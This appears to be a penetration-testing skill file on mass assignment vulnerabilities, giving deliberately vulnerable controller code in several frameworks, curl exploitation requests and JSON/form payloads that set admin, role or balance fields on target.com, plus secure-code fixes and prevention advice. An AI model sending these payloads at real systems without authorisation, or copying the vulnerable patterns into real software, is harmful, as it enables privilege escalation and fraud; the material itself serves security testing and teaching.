---
name: mass-assignment
description: Mass assignment exploitation for privilege escalation via ORM. Use when testing API parameter binding.
---

# Mass Assignment

## Description
Mass Assignment (also known as Object Injection or Auto-binding) is a vulnerability where an application automatically binds user-supplied input to object properties without proper filtering. Attackers can modify object attributes they shouldn't have access to, such as admin flags, roles, or other sensitive fields.

## How It Works

### Vulnerable Pattern
```python
# Python/Django example
def update_user(request):
    user = User.objects.get(id=request.user.id)
    # Dangerous: assigns ALL request parameters to user object
    for key, value in request.POST.items():
        setattr(user, key, value)
    user.save()
```

### Expected Request
```json
{
    "username": "john",
    "email": "john@example.com"
}
```

### Malicious Request
```json
{
    "username": "john",
    "email": "john@example.com",
    "isAdmin": true,
    "role": "administrator",
    "balance": 999999
}
```

## Framework-Specific Examples

### Ruby on Rails

**Vulnerable Code:**
```ruby
# app/controllers/users_controller.rb
def update
  @user = User.find(params[:id])
  @user.update(params[:user])  # Vulnerable!
end
```

**Exploitation:**
```bash
curl -X PUT "https://target.com/users/1" \
    -d "user[name]=john&user[email]=john@example.com&user[admin]=true"
```

**Secure Code:**
```ruby
def update
  @user = User.find(params[:id])
  @user.update(user_params)
end

private
def user_params
  params.require(:user).permit(:name, :email)  # Whitelist only
end
```

### Django (Python)

**Vulnerable Code:**
```python
def update_profile(request):
    user = request.user
    for field in request.POST:
        setattr(user, field, request.POST[field])
    user.save()
```

**Exploitation:**
```bash
curl -X POST "https://target.com/profile" \
    -d "email=john@example.com&is_superuser=True&is_staff=True"
```

**Secure Code:**
```python
def update_profile(request):
    allowed_fields = ['email', 'first_name', 'last_name']
    user = request.user
    for field in allowed_fields:
        if field in request.POST:
            setattr(user, field, request.POST[field])
    user.save()
```

### Node.js/Express

**Vulnerable Code:**
```javascript
app.put('/user/:id', (req, res) => {
    User.findByIdAndUpdate(req.params.id, req.body)  // Vulnerable!
        .then(user => res.json(user));
});
```

**Exploitation:**
```bash
curl -X PUT "https://target.com/user/1" \
    -H "Content-Type: application/json" \
    -d '{"name":"john","admin":true,"role":"superadmin"}'
```

**Secure Code:**
```javascript
app.put('/user/:id', (req, res) => {
    const allowedUpdates = ['name', 'email'];
    const updates = {};
    allowedUpdates.forEach(field => {
        if (req.body[field]) updates[field] = req.body[field];
    });
    User.findByIdAndUpdate(req.params.id, updates)
        .then(user => res.json(user));
});
```

### PHP/Laravel

**Vulnerable Code:**
```php
public function update(Request $request, $id)
{
    $user = User::find($id);
    $user->fill($request->all());  // Vulnerable!
    $user->save();
}
```

**Exploitation:**
```bash
curl -X PUT "https://target.com/users/1" \
    -d "name=john&email=john@example.com&is_admin=1"
```

**Secure Code:**
```php
// Option 1: Use $fillable in model
class User extends Model
{
    protected $fillable = ['name', 'email'];
}

// Option 2: Use $guarded in model
class User extends Model
{
    protected $guarded = ['is_admin', 'role'];
}

// Option 3: Explicit validation in controller
public function update(Request $request, $id)
{
    $validated = $request->validate([
        'name' => 'string|max:255',
        'email' => 'email'
    ]);
    User::find($id)->update($validated);
}
```

### ASP.NET

**Vulnerable Code:**
```csharp
[HttpPost]
public IActionResult Update(User user)
{
    _context.Users.Update(user);  // Vulnerable!
    _context.SaveChanges();
}
```

**Secure Code:**
```csharp
[HttpPost]
public IActionResult Update([Bind("Name,Email")] User user)
{
    _context.Users.Update(user);
    _context.SaveChanges();
}
```

## Common Exploitable Fields

### Authentication/Authorization
```
admin
isAdmin
is_admin
role
roles
permissions
privilege
user_type
access_level
```

### Account Status
```
active
verified
is_verified
confirmed
approved
banned
suspended
```

### Financial
```
balance
credit
points
subscription
plan
tier
```

### Password/Security
```
password
password_hash
password_digest
secret
api_key
token
```

### Relationships
```
user_id
owner_id
created_by
organization_id
tenant_id
```

## Testing Methodology

### 1. Identify Endpoints
```
- User registration
- Profile update
- Settings update
- Object creation/update APIs
```

### 2. Map Object Properties
```bash
# Check API responses for field names
curl https://target.com/api/user/1 | jq

# Look for hidden form fields
# Check JavaScript for object structures
```

### 3. Test Additional Parameters
```bash
# Add suspicious parameters to requests
curl -X PUT "https://target.com/api/user/1" \
    -H "Content-Type: application/json" \
    -d '{"name":"john","admin":true}'
```

### 4. Verify Changes
```bash
# Check if unauthorized changes were applied
curl https://target.com/api/user/1 | jq '.admin'
```

## Payload Examples

### JSON Payloads
```json
{"name":"test","role":"admin"}
{"name":"test","isAdmin":true}
{"name":"test","permissions":["read","write","admin"]}
{"name":"test","user_type":"administrator"}
{"name":"test","balance":999999}
```

### Form Data Payloads
```
name=test&role=admin
name=test&is_admin=1
name=test&verified=true
name=test&subscription_type=premium
```

### Nested Object Payloads
```json
{"user":{"name":"test","role":"admin"}}
{"profile":{"settings":{"admin":true}}}
{"account":{"balance":999999,"verified":true}}
```

## Testing Checklist

- [ ] Identify all update/create endpoints
- [ ] Map model/object properties
- [ ] Test adding admin/role parameters
- [ ] Test modifying user_id/owner_id
- [ ] Test financial field manipulation
- [ ] Test nested object injection
- [ ] Test array parameter injection
- [ ] Verify changes were applied
- [ ] Check for error messages revealing fields

## Prevention

### 1. Whitelist Approach
```
Only accept explicitly allowed parameters
```

### 2. Use DTOs (Data Transfer Objects)
```
Create specific objects for input with limited fields
```

### 3. Framework Protection
```
Ruby: strong_parameters
Django: Forms with defined fields
Laravel: $fillable / $guarded
Express: Input validation middleware
```

### 4. Validation Layer
```
Validate and sanitize all input
Use schema validation (Joi, Yup, etc.)
```

## References
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Mass%20Assignment
- https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html
- https://owasp.org/API-Security/editions/2019/en/0xa6-mass-assignment/
